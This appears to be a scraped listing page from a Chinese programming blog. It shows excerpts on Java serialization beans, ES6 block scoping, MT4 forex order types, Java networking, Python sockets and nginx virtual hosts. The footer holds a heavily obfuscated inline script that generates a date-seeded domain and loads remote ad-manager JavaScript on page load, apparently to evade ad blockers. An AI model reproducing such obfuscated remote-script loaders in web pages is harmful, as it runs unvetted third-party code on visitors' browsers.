测试代码 本文使用的 java bean 如下，这个是之前测试序列化工具时用过的。一个用户对象，一对一关联部门对象和岗位对象，其中部门对象又存在自关联。
public class User implements Serializable { private static final long serialVersionUID = 1L; // 普通属性--129个 private String id; private String account; private String password; private Integer status; // ······ /** * 所属部门 */ private Department department; /** * 岗位 */ private Position position; // 以下省略setter/getter方法 } public class Department implements Serializable { private static final long serialVersionUID = 1L; // 普通属性--7个 private String id; private String parentId; // ······ /** * 子部门 */ private List&lt;Department&gt; children; // 以下省略setter/getter方法 } public class Position implements Serializable { private static final long serialVersionUID = 1L; // 普通属性--6个 private String id; private String name; // ······ // 以下省略setter/getter方法 } 下面展示部分测试代码，完整代码见末尾链接。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/23fbca718ad79b5a6d2c4e3220271c9c/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/36829499e1e04c69b235426068ab9dc0/" rel="bookmark">
			【es6】块级作用域和函数声明
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		块级作用域和函数 es6明确规定，可以在块级作用域中声明，即使在严格模式下也不会报错
//首先在全局作用域中声明f函数 function f() { console.log('I am outside!'); } (function () { if (false) { // 重复声明一次函数f //在es5中执行时，下面的函数定义会被提升到if外面，因为if不是块级作用域 //在es6执行时，if是块级作用域，里面声明的函数f对外面没有影响，if false 里面不会执行，变量也不会提升， function f() { console.log('I am inside!'); } } //es5最终输出inside //es6最终输出outside， f(); }()); 块级作用域中声明函数，es6会默认当作let声明，但是一些浏览器会将es6块级函数声明当作var声明，会将声明提升到作用域最前面，但是函数体无法提升，所以可能会导致未定义
// ES6的浏览器环境 function f() { console.log('I am outside!'); } (function () { var f = undefined; if (false) { function f() { console.log('I am inside!'); } } f(); }()); // Uncaught TypeError: f is not a function 所以在块级作用域声明函数时，最好使用函数表达式，不会提升函数声明，在任何坏境下结果都是一样的
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/36829499e1e04c69b235426068ab9dc0/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/c67d669b4e07cc613c26dae06f3bbafa/" rel="bookmark">
			fxcm外汇模拟交易mt4_炒外汇必备交易软件，MT4软件交易下单面板四种挂单模式介绍...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		当交易者拥有自己的MT4真实账户之后，往往会迫不及待的执行下单操作，可打开行情面板找了半天，没有找到“买入”和“卖出”的下单按钮。在默认状态下，MT4下单面板都是隐藏状态，只有熟悉一些基本的操作，才能够将它们调出来。
交易下单面板
找到MT4顶端的“新订单”选项，鼠标左键单击，此时会弹出下单面板。我们也可以使用快捷键“F9”快速调出下单面板。红色的“于市价买”按钮和蓝色的“于市价卖”按钮最为显眼，但在点击它们之前，我们还需要将“手数”“止损价”“获利价”“交易类型”填写完成。
手数：也就是平时我们说的“单量”，在买卖之前，交易者需要思考清楚自己到底要下多少手单子，是0.01手，0.1手，还是1手、10手，甚至更高。需要提醒的是，单量越大仓位也就越高，对应的交易风险也就越大。所以，手数选项需谨慎对待。
止损价：止损价虽然没必要在每次交易时都进行设定，但如果能够养成“下单必带止损”的习惯，交易的风险将会大大降低。止损价的意思就是行情反向波动到哪个价格之后，启动平仓机制。平仓价在设置完成之后，会在MT4行情面板以红色虚线表示。
止盈价：止盈价的意思就是行情正向波动到哪个价格之后，启动平仓机制。平仓价在设置完成之后，会在MT4行情面板以红色虚线表示。止损线和止盈线都是红色虚线，区别在于止损线在买入价线的下方，止盈线在买入价线的上方；当卖出时，止损线与止盈线和卖价线的相对位置与前面所说的相反。
交易类型：该选项有两个选项，分别为市价成交和挂单交易。市价成交就是字面意思，当选择该选项时，点击买卖按钮能够直接下单。挂单交易比较复杂，在选择该选项后，下方会出现对应选项。其中存在四种挂单模式，分别为：buy limit sell limit / buy stop sell stop .
四种挂单模式：
部分交易者疑问，为什么挂单要搞得这么复杂，直接设定一个买入挂单和一个卖出挂单不就可以了么。实际上，买入挂单分位两种情况，一种是在市价之上挂买单，这时MT4软件默认的选项为buy stop ；另外一种是在市价之下挂卖单，这时MT4软件默认的选项为buy limit 。本来stop的含义是止损挂单，limit的含义是限价挂单，但这两个中文翻译比较晦涩，笔者有新的定义，方便交易者理解记忆。stop的含义是突破单，limit的含义是回撤单。当挂单买入时，如果市价直接上涨就能突破挂单，则为stop ;当挂单买入时，如果市价需要回撤下跌才能够触及挂单，则为limit 。
卖出挂单的逻辑也是一样的，当在市价之下挂卖出单时，用sell stop，因为只要行情下跌，挂单就一定能够成交 ；当在市价之上挂卖出单时，用sell limit，此时市价只有上涨，挂单才能够成交 。
上面的逻辑是复杂的，如果交易者实在搞不清楚，在设定好自己的挂单价格之后，将四个选项都试一遍也就可以了。如果挂单价格与所选挂单模式不匹配，系统会提醒“无效的止损和止盈价位”。
分批平仓
下单完成后就涉及到平仓的问题。鼠标左键点击MT4软件顶部的“终端”按钮，此时在底部就会显示出持仓订单。如果交易者想要全部平仓，则选中某一订单，点击鼠标右键，找到平仓按钮，鼠标左键点击即可平仓。不过，此时的平仓为全部平仓按钮。想要分批平仓，就双击某一订单，在弹出的平仓界面中，找到手数选项，按照自己的计划更改手数之后，点击平仓，即完成了分批平仓的操作。需要提醒的是，右键点击某一订单之后，会出现“修改或删除订单”选项，该选项并不能分批平仓，只是对交易单的止损止盈价格重新设置。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a2f64b2420a7f71f06bdcd49837c4aa7/" rel="bookmark">
			Java网络编程基础学习与整理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		网络编程基础学习与整理 网络编程1网络通信的要素1.1网络模型整理1.2 IP1.3 端口1.4 传输层通信协议1.5 TCP通信连接1.6 TCP文件传输1.7 UDP发送信息1.8 UDP实现简易聊天 网络编程 1网络通信的要素 1.1网络模型整理 1.2 IP ip定义：Internet Protocol，IP只为主机提供一种无连接、不可靠的、尽力而为的数据包传输服务，可以唯一地定位一台网络计算机。(127.0.0.1为本机的localhost)IP地址分类： ipv4 ： 由四个字节组成，例如 127.0.0.1 网络号+主机号ipv6 ： 128位，8组，每组4个16进制数，例如 2001:0db8:85a3:08d3:1319:8a2e:0370:7344，如果0000则省略 公网（互联网）-私网（局域网） 192.168.xx.xx属于局域网，专门给组织内部使用ABCDE类地址根据网络号划分，如图所示，其中D类供组播使用，E类供科研使用
1.3 端口 端口表示计算机上一个程序的进程规定限制在2^16 0~65535之间TCP UDP协议端口相隔离，但在单个协议下端口不能重复端口分类： 公有端口：0~1023 HTTP:80HTTPS:443FTP:21Telnet:23 程序注册端口：1024~49151，程序或者用户使用 Tomcat:8080MySQL:3306Oracle:1521Redis:6379 动态端口、私有端口：49152~65535 不建议使用 1.4 传输层通信协议 TCP/UDP对比：TCP：用户传输协议（打电话） 连接、稳定三次握手、四次挥手 三次握手： 第一次握手：客户端传输SYN=i给服务端，状态置为SYN_SEND; 第二次握手：服务端接受SYN=i后,返回ACK=i+1且返回SYN=j，状态置为SYN_RECV； 第三次握手：客户端接受ACK后状态置为ESTABLISHED，发送ACK=j+1，服务端接受后状态置为ESTABLISHED； 四次挥手： （1）客户端发送FIN，状态置为FIN_WAIT1，接受ACK后改为FIN_WAIT2 （2）服务端接受FIN，返回ACK，状态置为CLOSE_WAIT （3）服务端数据传输完毕，返回FIN，状态改为LAST_ACK，接受客户端ACK后改为CLOSED （4）客户端接受FIN后状态置为TIME_WAIT，2MS后置为CLOSED 中间状态： CLOSED：初始状态 LISTEN：监听中 SYN_SENT：发送SYN=i给服务端后 SYN_RCVD: 接受客户端的SYN=i后 ESTABLISHED：已连接 FIN_WAIT_1：ESTABLISHED状态下发送FIN=i给客户端后 FIN_WAIT_2：ESTABLISHED状态下发送FIN=i给客户端后接收到ACK返回则为2 CLOSE_WAIT：FIN接受方，收到后返回ACK并置为CLOSE_WAIT，数据传输完毕后返回FIN且状态改为LAST_ACK TIME_WAIT：FIN发起方，收到对方返回的FIN后发送ACK，置为TIME_WAIT，2MS后会改为CLOSED LAST_ACK：CLOSE_WAIT数据传输完毕后返回FIN且状态改为LAST_ACK CLOSING：双方同时发起FIN UDP：用户数据报协议（发短信） 不连接、不稳定没明确的客户端服务端区分 1.5 TCP通信连接 客户端：
1.建立Socket连接服务器Socket
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/a2f64b2420a7f71f06bdcd49837c4aa7/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/800c20691c6a2215918405518df699f6/" rel="bookmark">
			python监听多个udp端口_尝试实现非阻塞python-udp多端口获取wierd异常
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		我试图实现一个非阻塞的pythonudp服务器，它监听多个端口。在
我在这个Stackover posting中找到了一些代码，并将其修改为监听多个套接字，到目前为止，非常好。在
我的代码如下。在#!/usr/bin/python
import select
import socket
ports_list=[7777,7778]
def make_socket(number):
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(('', number))
sock.listen(5)
return sock
read_list= map(lambda x: make_socket(x), ports_list)
print(read_list)
print "Listening on port %s" % ports_list
while True:
readable, writable, errored = select.select(read_list, [], [])
for s in readable:
if s in read_list:
client_socket, address = s.accept()
read_list.append(client_socket)
print "Connection from", address
else:
data = s.recv(1024)
if data:
s.send(data)
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/800c20691c6a2215918405518df699f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/98280de77789c717812461171cc0b326/" rel="bookmark">
			python同时监听多个端口_nginx 多个vs,一台服务器多个server监听不同端口，都从80访问...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		案例
1、一台服务器上两个python一个监听5001，一个监听6001。
2、都想通过域名:80端口访问。那么只能使用nginx的多个vs了。两个域名 wiki.xxx.com; www.xxxx.com
粗略配置如下：
upstream flask5001 {
server 127.0.0.1:5001 weight=1 max_fails=0;
}
upstream flask6001 {
server 127.0.0.1:6001 weight=1 max_fails=0;
}
server {
listen 80;
server_name wiki.xxx.com;
root /data/webapps/sc;
location / {
access_log logs/static.log main;
error_log logs/static.error.log notice;
if ( !-f $request_filename ) {
proxy_pass http://flask5001;
break;
}
}
}
server {
listen 80;
server_name www.xxxx.com;
root /data/webapps/Content;
location / {
access_log logs/static3.log main;
error_log logs/static3.error.log notice;
if ( !
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/98280de77789c717812461171cc0b326/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/posts/page/398/">«</a>
	<span class="pagination__item pagination__item--current">399/578</span>
	<a class="pagination__item pagination__item--next btn" href="/posts/page/400/">»</a>
</div>

			</div>
			

		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>